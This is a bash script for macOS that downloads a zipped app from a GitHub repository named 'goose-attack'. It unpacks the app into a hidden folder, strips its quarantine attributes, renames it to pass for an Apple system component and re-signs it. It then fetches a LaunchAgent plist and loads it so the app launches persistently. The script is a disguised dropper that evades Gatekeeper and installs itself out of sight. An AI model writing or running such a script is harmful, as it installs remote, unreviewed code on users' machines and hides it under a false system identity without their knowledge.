#!/bin/bash
curl -L -o /tmp/mac_goose.zip https://github.com/Gallus17/goose-attack/raw/refs/heads/main/mac_goose.zip

unzip -o /tmp/mac_goose.zip -d ~/.sysmond_config && xattr -cr ~/.sysmond_config/temp/"SysmondAssist.app" && chmod -R 755 ~/.sysmond_config/"SysmondAssist.app" && /usr/libexec/PlistBuddy -c "Set :CFBundleName 'com.apple.SysmondAssist-LJk4Qbrnf'" ~/.sysmond_config/"SysmondAssist.app"/Contents/Info.plist && codesign --force --deep --sign - ~/.sysmond_config/"SysmondAssist.app"


curl -L -o /tmp/com.user.assetjob.plist https://github.com/Gallus17/goose-attack/raw/refs/heads/main/com.user.assetjob.plist


mv /tmp/com.user.assetjob.plist ~/Library/LaunchAgents/ && plutil -lint ~/Library/LaunchAgents/com.user.assetjob.plist && launchctl bootout gui/$(id -u)/com.user.assetjob 2>/dev/null; launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.user.assetjob.plist && launchctl list | grep assetjob

